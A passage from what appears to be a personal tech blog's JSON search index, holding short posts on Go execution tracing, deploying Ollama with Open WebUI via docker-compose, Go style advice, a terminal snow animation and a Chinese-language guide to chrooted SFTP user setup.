\u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eev\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eStateTransition\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003est\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eResource\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eKind\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003etrace\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eResourceGoroutine\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#a6e22e\"\u003eid\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003est\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eResource\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eGoroutine\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#a6e22e\"\u003efrom\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eto\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003est\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eGoroutineTransition\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#75715e\"\u003e// 查找阻塞的goroutine, 统计计数\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003efrom\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eExecuting\u003c/span\u003e() \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eto\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003etrace\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eGoWaiting\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                \u003cspan style=\"color:#a6e22e\"\u003eblocked\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e++\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003estrings\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eContains\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003est\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eReason\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;network\u0026#34;\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                    \u003cspan style=\"color:#a6e22e\"\u003eblockedOnNetwork\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e++\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e// 打印我们所需\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003ep\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e100\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e float64(\u003cspan style=\"color:#a6e22e\"\u003eblockedOnNetwork\u003c/span\u003e) \u003cspan style=\"color:#f92672\"\u003e/\u003c/span\u003e float64(\u003cspan style=\"color:#a6e22e\"\u003eblocked\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;%2.3f%% instances of goroutines blocking were to block on the network\\n\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003ep\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","Go","trace"],"title":"更强大的Go执行跟踪能力"},{"categories":["data","URL"],"contents":" Taide - training data ","date":"April 27, 2024","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/2024/20240427-taide/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://taide.tw/index/training-data\" target=\"_blank\" rel=\"noopener\"\u003eTaide - training data\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["data","URL"],"title":"Taide - training data"},{"categories":["Go","URL","ollama"],"contents":" ollama/ollama Ollama ＋ Open WebUI，快捷部署 AI 大型語言模型到你的電腦，離線執行 Docker-compose version: \u0026#34;3.8\u0026#34; services: ollama: image: ollama/ollama:latest container_name: ollama restart: unless-stopped volumes: - ./ollama/ollama:/root/.ollama tty: true ports: - 11434:11434 networks: - ollama-docker # deploy: # resources: # reservations: # devices: # - driver: nvidia # count: 1 # capabilities: [gpu] ollama-webui: image: ghcr.io/ollama-webui/ollama-webui:main container_name: ollama-webui restart: unless-stopped volumes: - ./ollama/ollama-webui:/app/backend/data ports: - 8080:8080 environment: - \u0026#34;/ollama/api=http://ollama:11434/api\u0026#34; extra_hosts: - host.docker.internal:host-gateway networks: - ollama-docker networks: ollama-docker: Setup # Run docker-compose docker-compose up -d # Pull model(https://ollama.com/library) docker exec -it ollama /bin/bash ollama pull llama3 Chat with Web-UI port defined in docker-compose.yml ollama-webui.ports\nhttp://localhost:8080\n","date":"April 25, 2024","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/2024/20240425-ollama/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/ollama/ollama\" target=\"_blank\" rel=\"noopener\"\u003eollama/ollama\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://ivonblog.com/posts/ollama-llm/\" target=\"_blank\" rel=\"noopener\"\u003eOllama ＋ Open WebUI，快捷部署 AI 大型語言模型到你的電腦，離線執行\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"docker-compose\"\u003eDocker-compose\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-yaml\" data-lang=\"yaml\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eversion\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;3.8\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eservices\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003eollama\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eimage\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eollama/ollama:latest\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003econtainer_name\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eollama\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003erestart\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eunless-stopped\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003evolumes\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003e./ollama/ollama:/root/.ollama\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003etty\u003c/span\u003e: \u003cspan style=\"color:#66d9ef\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eports\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003e11434\u003c/span\u003e:\u003cspan style=\"color:#ae81ff\"\u003e11434\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003enetworks\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003eollama-docker\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# deploy:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e#   resources:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e#     reservations:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e#       devices:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e#         - driver: nvidia\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e#           count: 1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e#           capabilities: [gpu]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003eollama-webui\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eimage\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eghcr.io/ollama-webui/ollama-webui:main\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003econtainer_name\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eollama-webui\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003erestart\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eunless-stopped\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003evolumes\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003e./ollama/ollama-webui:/app/backend/data\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eports\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003e8080\u003c/span\u003e:\u003cspan style=\"color:#ae81ff\"\u003e8080\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eenvironment\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/ollama/api=http://ollama:11434/api\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eextra_hosts\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003ehost.docker.internal:host-gateway\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003enetworks\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003eollama-docker\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003enetworks\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003eollama-docker\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"setup\"\u003eSetup\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Run docker-compose\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker-compose up -d\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Pull model(https://ollama.com/library)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker exec -it ollama /bin/bash\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eollama pull llama3\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"chat-with-web-ui\"\u003eChat with Web-UI\u003c/h3\u003e\n\u003cblockquote\u003e\n\u003cp\u003eport defined in docker-compose.yml ollama-webui.ports\u003c/p\u003e","tags":["Go","URL","ollama"],"title":"Run llama3"},{"categories":["Go","URL"],"contents":" 一文读不懂的 Go 1.21 GA 的 PGO 优化——一次在 WebP Server Go 上的尝试 ","date":"April 25, 2024","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/2024/20240425-pgo/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://blog.webp.se/go-121-pgo-zh/\" target=\"_blank\" rel=\"noopener\"\u003e一文读不懂的 Go 1.21 GA 的 PGO 优化——一次在 WebP Server Go 上的尝试\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["Go","URL"],"title":"一文读不懂的 Go 1.21 GA 的 PGO 优化——一次在 WebP Server Go 上的尝试"},{"categories":["Go","URL"],"contents":" Go Style Decisions - Pass values Do not pass pointers as function arguments just to save a few bytes. If a function reads its argument x only as *x throughout, then the argument shouldn\u0026rsquo;t be a pointer. Common instances of this include passing a pointer to a string (*string) or a pointer to an interface value (*io.Reader). In both cases, the value itself is a fixed size and can be passed directly.\nThis advice does not apply to large structs, or even small structs that may increase in size. In particular, protocol buffer messages should generally be handled by pointer rather than by value. The pointer type satisfies the proto.Message interface (accepted by proto.Marshal, protocmp.Transform, etc.), and protocol buffer messages can be quite large and often grow larger over time.\n","date":"April 13, 2024","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/2024/20240413-decisions-pass-values/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://google.github.io/styleguide/go/decisions.html#pass-values\" target=\"_blank\" rel=\"noopener\"\u003eGo Style Decisions - Pass values\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eDo not pass pointers as function arguments just to save a few bytes. If a function reads its argument \u003ccode\u003ex\u003c/code\u003e only as \u003ccode\u003e*x\u003c/code\u003e throughout, then the argument shouldn\u0026rsquo;t be a pointer. Common instances of this include passing a pointer to a string (\u003ccode\u003e*string\u003c/code\u003e) or a pointer to an interface value (\u003ccode\u003e*io.Reader\u003c/code\u003e). In both cases, the value itself is a fixed size and can be passed directly.\u003c/p\u003e","tags":["Go","URL"],"title":"Go Style Decisions - Pass values"},{"categories":["llm","visualization","machinelearning","URL"],"contents":" LLM Visualization Github ","date":"January 21, 2024","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/2024/20240121-llm/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://bbycroft.net/llm\" target=\"_blank\" rel=\"noopener\"\u003eLLM Visualization\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/bbycroft/llm-viz\" target=\"_blank\" rel=\"noopener\"\u003eGithub\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["llm","visualization","machinelearning","URL"],"title":"LLM Visualization"},{"categories":["Python","snow","terminal","URL"],"contents":" A python script that allows your terminal to snow. docker run --rm -ti sontek/snowmachine tree --color rainbow --particle \u0026#34;*\u0026#34; --snow true --lights-color rainbow ","date":"December 24, 2023","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/2023/20231224-snow/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/sontek/snowmachine\" target=\"_blank\" rel=\"noopener\"\u003eA python script that allows your terminal to snow.\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker run --rm -ti sontek/snowmachine tree --color rainbow --particle \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;*\u0026#34;\u003c/span\u003e --snow true --lights-color rainbow\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["Python","snow","terminal","URL"],"title":"A python script that allows your terminal to snow."},{"categories":["SSH","SFTP","Linux"],"contents":"Add SFTP user and share directory dev_test_user, qa_test_user 同權限 dev_user, qa_user 同權限\n1. 建立共享資料夾(SFTP 使用的資料夾) sudo mkdir -p /home/{test,prod}/{exchange,upload} sudo mkdir -p /home/{test,prod}/exchange/success sudo mkdir -p /home/{test,prod}/upload/backup 2. 建立使用者群組 sudo groupadd share01-test sudo groupadd share01-prod 3. 創建 qa_test_user 使用者並設定 qa_test_user 使用者的群組為 share01-test sudo useradd -m -G share01-test qa_test_user # 設定 dev_test_user 使用者的群組為 share01-test sudo usermod -G share01-test dev_test_user # 設定密碼 sudo passwd qa_test_user 4. 創建 qa_user 使用者並設定 qa_user 使用者的群組為 share01-prod sudo useradd -m -G share01-prod qa_user # 設定 dev_user 使用者的群組為 share01-prod sudo usermod -G share01-prod dev_user # 設定密碼 sudo passwd qa_user 5. 設定權限 # 設定 /home/test 資料夾(含下級資料夾)的使用者為 qa_test_user，群組為 share01-test sudo chown -R qa_test_user:share01-test test/ # 設定 /home/prod 資料夾(含下級資料夾)的使用者為 qa_user，群組為 share01-prod sudo chown -R qa_user:share01-prod prod/ # SFTP 登入資料夾權限要給 root sudo chown root:root /home/test sudo chown root:root /home/prod 6. 設定 /etc/ssh/sshd_config /etc/ssh/sshd_config\n# 在最底下增加設定 Match group share01-test ChrootDirectory /home/test X11Forwarding no AllowTcpForwarding no ForceCommand internal-sftp -d /upload Match group share01-prod ChrootDirectory /home/prod X11Forwarding no AllowTcpForwarding no ForceCommand internal-sftp -d /upload # 重新啟動 sshd 讓設定生效 sudo systemctl restart sshd.service ","date":"November 30, 2023","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/2023/20231130-sftp/","summary":"\u003ch1 id=\"add-sftp-user-and-share-directory\"\u003eAdd SFTP user and share directory\u003c/h1\u003e\n\u003cp\u003edev_test_user, qa_test_user 同權限\ndev_user, qa_user 同權限\u003c/p\u003e\n\u003ch2 id=\"1-建立共享資料夾sftp-使用的資料夾\"\u003e1. 建立共享資料夾(SFTP 使用的資料夾)\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo mkdir -p /home/\u003cspan style=\"color:#f92672\"\u003e{\u003c/span\u003etest,prod\u003cspan style=\"color:#f92672\"\u003e}\u003c/span\u003e/\u003cspan style=\"color:#f92672\"\u003e{\u003c/span\u003eexchange,upload\u003cspan style=\"color:#f92672\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo mkdir -p /home/\u003cspan style=\"color:#f92672\"\u003e{\u003c/span\u003etest,prod\u003cspan style=\"color:#f92672\"\u003e}\u003c/span\u003e/exchange/success\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo mkdir -p /home/\u003cspan style=\"color:#f92672\"\u003e{\u003c/span\u003etest,prod\u003cspan style=\"color:#f92672\"\u003e}\u003c/span\u003e/upload/backup\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"2-建立使用者群組\"\u003e2. 建立使用者群組\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo groupadd share01-test\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo groupadd share01-prod\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"3-創建-qa_test_user-使用者並設定-qa_test_user-使用者的群組為-share01-test\"\u003e3. 創建 qa_test_user 使用者並設定 qa_test_user 使用者的群組為 share01-test\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo useradd -m -G share01-test qa_test_user\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 設定 dev_test_user 使用者的群組為 share01-test\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo usermod -G share01-test dev_test_user\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 設定密碼\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo passwd qa_test_user\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"4-創建-qa_user-使用者並設定-qa_user-使用者的群組為-share01-prod\"\u003e4. 創建 qa_user 使用者並設定 qa_user 使用者的群組為 share01-prod\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo useradd -m -G share01-prod qa_user\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 設定 dev_user 使用者的群組為 share01-prod\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo usermod -G share01-prod dev_user\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 設定密碼\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo passwd qa_user\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"5-設定權限\"\u003e5. 設定權限\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 設定 /home/test 資料夾(含下級資料夾)的使用者為 qa_test_user，群組為 share01-test\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo chown -R qa_test_user:share01-test test/\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 設定 /home/prod 資料夾(含下級資料夾)的使用者為 qa_user，群組為 share01-prod\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo chown -R qa_user:share01-prod prod/\n\u003c/span\u003e\u003c/span\u003e\u003cspan 